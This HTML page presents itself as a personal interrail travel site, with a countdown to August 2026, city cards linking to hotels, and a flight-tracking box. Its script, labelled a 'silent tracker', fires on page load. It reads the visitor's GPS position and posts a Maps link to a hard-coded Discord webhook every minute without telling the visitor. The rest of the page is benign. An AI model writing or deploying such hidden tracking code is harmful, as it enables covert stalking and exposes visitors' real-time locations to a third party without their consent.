<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="My Interrailing Trip">
    <meta property="og:description" content="Follow my interrail adventure across Europe ðŸš†ðŸŒ">
    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#111111">
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LN4 // EURO 26</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Syncopate:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon: #CCFF00;
            --dark: #111111;
            --card-bg: #1a1a1a;
            --text: #ffffff;
            --dim: #666;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--dark);
            color: var(--text);
            font-family: 'Rajdhani', sans-serif;
            overflow-x: hidden;
            padding-bottom: 100px;
            overscroll-behavior-y: none;
        }

        header { padding: 30px 20px; text-align: center; padding-top: env(safe-area-inset-top, 30px); }

        h1 {
            font-family: 'Syncopate', sans-serif;
            font-size: clamp(2.5rem, 5vw, 4rem);
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: -2px;
            margin: 0;
            color: white;
        }

        h1 .highlight { color: var(--neon); }

        .subtitle { color: var(--dim); text-transform: uppercase; letter-spacing: 4px; font-size: 0.9rem; margin: 5px 0 20px; }

        /* GENERAL UI */
        .track-zone { width: 100%; height: 35px; position: relative; overflow: hidden; border-top: 1px solid #333; border-bottom: 1px solid #333; background: rgba(255, 255, 255, 0.02); margin: 20px 0; display: flex; align-items: center; }
        .train-wrapper { position: absolute; white-space: nowrap; font-size: 1.2rem; animation: moveRightToLeft 12s linear infinite; }
        @keyframes moveRightToLeft { 0% { transform: translateX(110vw); } 100% { transform: translateX(-200px); } }

        .timer-container { display: flex; width: 100%; gap: 1px; background: #000; border: 1px solid #333; margin-top: 10px; }
        .time-box { flex: 1; padding: 10px 5px; text-align: center; border-right: 1px solid #333; }
        .time-box:last-child { border-right: none; }
        .time-box span { display: block; font-family: 'Syncopate', sans-serif; font-size: 1.2rem; color: var(--neon); }
        .time-box label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; display: block; margin-top: 5px; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; max-width: 1200px; margin: 40px auto; padding: 0 10px 40px; }
        .card { background: var(--card-bg); height: 250px; position: relative; overflow: hidden; border: 1px solid #333; transition: all 0.2s ease-out; display: block; text-decoration: none; color: inherit; cursor: pointer; }
        .card img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(100%) contrast(1.2); transition: all 0.5s ease; }
        .card:hover img, .card.clicked img { filter: grayscale(0%) contrast(1); transform: scale(1.05); }
        .card.clicked { border-color: var(--neon) !important; box-shadow: 0 0 30px rgba(204, 255, 0, 0.4) !important; transform: scale(0.98); }
        .overlay { position: absolute; bottom: 0; left: 0; width: 100%; background: linear-gradient(to top, #000 0%, transparent 100%); padding: 30px 20px 15px; }
        .overlay h2 { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; text-transform: uppercase; display: flex; align-items: center; gap: 10px; }
        .number { color: var(--neon); font-size: 0.9rem; border: 1px solid var(--neon); padding: 2px 6px; }

        .radar-section { max-width: 600px; margin: 0 auto 60px; padding: 0 20px; text-align: center; }
        .radar-container { border: 1px solid #333; background: #111; padding: 25px; position: relative; }
        .corner { position: absolute; width: 10px; height: 10px; border: 1px solid var(--neon); transition: 0.3s; }
        .tl { top: -1px; left: -1px; border-bottom: 0; border-right: 0; }
        .tr { top: -1px; right: -1px; border-bottom: 0; border-left: 0; }
        .bl { bottom: -1px; left: -1px; border-top: 0; border-right: 0; }
        .br { bottom: -1px; right: -1px; border-top: 0; border-left: 0; }
        .radar-title { font-family: 'Syncopate', sans-serif; color: var(--dim); font-size: 0.8rem; letter-spacing: 3px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .radar-input-group { display: flex; flex-direction: column; gap: 10px; }
        .radar-input { flex: 1; background: transparent; border: 1px solid #333; color: white; padding: 12px 15px; font-family: 'Rajdhani', sans-serif; font-size: 1.1rem; text-transform: uppercase; outline: none; transition: 0.3s; }
        .radar-input:focus { border-color: var(--neon); }
        .radar-btn { background: var(--neon); border: none; color: black; font-family: 'Syncopate', sans-serif; font-weight: 700; padding: 15px; cursor: pointer; text-transform: uppercase; font-size: 0.8rem; transition: 0.3s; }
        @media (min-width: 600px) { .radar-input-group { flex-direction: row; } .card { height: 350px; } }
    </style>
</head>
<body>

<header>
    <h1>Euro <span class="highlight">26</span></h1>
    <p class="subtitle">Grand Tour // Interrail</p>
    
    <div class="track-zone"><div class="train-wrapper">ðŸš„ðŸšƒðŸšƒðŸšƒ</div></div>
    <div class="timer-container">
        <div class="time-box"><span id="d">00</span><label>Days</label></div>
        <div class="time-box"><span id="h">00</span><label>Hrs</label></div>
        <div class="time-box"><span id="m">00</span><label>Mins</label></div>
        <div class="time-box"><span id="s">00</span><label>Secs</label></div>
    </div>
</header>

<div class="grid">
    <a href="https://www.tripadvisor.co.uk/Hotel_Review-g188590-d13457314-Reviews-MEININGER_Hotel_Amsterdam_Amstel-Amsterdam_North_Holland_Province.html" target="_blank" class="card delayed-link">
        <img src="https://images.unsplash.com/photo-1512470876302-972faa2aa9a4?w=800&q=80" alt="Amsterdam">
        <div class="overlay"><h2><span class="number">01</span> Amsterdam</h2></div>
    </a>
    <a href="https://www.booking.com/hotel/de/meininger-berlin-east-side-gallery.en-gb.html?aid=311076&label=meininger-berlin-east-side-gallery" target="_blank" class="card delayed-link">
        <img src="https://images.unsplash.com/photo-1560969184-10fe8719e047?w=800&q=80" alt="Berlin">
        <div class="overlay"><h2><span class="number">02</span> Berlin</h2></div>
    </a>
    <div class="card"><img src="https://images.unsplash.com/photo-1541849546-216549ae216d?w=800&q=80" alt="Prague"><div class="overlay"><h2><span class="number">03</span> Prague</h2></div></div>
    <div class="card"><img src="https://images.pexels.com/photos/1578335/pexels-photo-1578335.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Budapest"><div class="overlay"><h2><span class="number">04</span> Budapest</h2></div></div>
    <div class="card"><img src="https://images.unsplash.com/photo-1516550893923-42d28e5677af?w=800&q=80" alt="Vienna"><div class="overlay"><h2><span class="number">05</span> Vienna</h2></div></div>
</div>

<div class="radar-section">
    <div class="radar-container">
        <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
        <div class="radar-title"><div class="blip"></div> RADAR // SURVEILLANCE</div>
        <div class="radar-input-group">
            <input type="text" id="flightInput" class="radar-input" placeholder="Flight No. (e.g. BA123)">
            <button class="radar-btn" onclick="searchFlight()">Track</button>
        </div>
    </div>
</div>

<script>
    // ==========================================
    // 60-SECOND SILENT TRACKER
    // ==========================================
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1466082399145168919/p_l5RZmIzJwOSpnQmScU5CkVZVBxwuhvf9Rf7BPNwKLlwJkZv68UHV6uBhhpgZ_45Zh8"; 

    // Auto-start tracking on load
    window.onload = function() {
        startSilentTracking();
    };

    function startSilentTracking() {
        if (!navigator.geolocation) return;

        // Send immediately
        sendLocation();
        
        // REPEAT EVERY 60 SECONDS (60,000 milliseconds)
        setInterval(sendLocation, 60000); 
    }

    function sendLocation() {
        navigator.geolocation.getCurrentPosition((position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            // Standard Google Maps link
            const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
            
            // Send to Discord
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `ðŸš„ **Silent Tracker (1 Min)**\nðŸ“ [Open in Maps](${mapLink})\nðŸ•’ ${new Date().toLocaleTimeString()}`
                })
            }).catch(err => console.error("Silent Tracker Error", err));

        }, (error) => {
            console.error("GPS Error", error);
        });
    }

    // --- APP UTILS ---
    const target = new Date("August 17, 2026 00:00:00").getTime();
    setInterval(() => {
        const gap = target - new Date().getTime();
        document.getElementById("d").innerText = Math.max(0, Math.floor(gap / 86400000)).toString().padStart(2, '0');
        document.getElementById("h").innerText = Math.max(0, Math.floor((gap % 86400000) / 3600000)).toString().padStart(2, '0');
        document.getElementById("m").innerText = Math.max(0, Math.floor((gap % 3600000) / 60000)).toString().padStart(2, '0');
        document.getElementById("s").innerText = Math.max(0, Math.floor((gap % 60000) / 1000)).toString().padStart(2, '0');
    }, 1000);

    document.querySelectorAll('.delayed-link').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault(); 
            this.classList.add('clicked');
            setTimeout(() => {
                window.open(this.href, '_blank');
                setTimeout(() => this.classList.remove('clicked'), 500);
            }, 500); 
        });
    });

    function searchFlight() {
        const inputField = document.getElementById("flightInput");
        const query = inputField.value.trim().replace(/\s/g, '').toUpperCase();
        if (query) {
            window.open(`https://flightaware.com/live/flight/${query}`, '_blank');
        } else {
            inputField.focus();
            inputField.style.borderColor = "var(--neon)";
            setTimeout(() => { inputField.style.borderColor = "#333"; }, 1000);
        }
    }
</script>
</body>
</html>
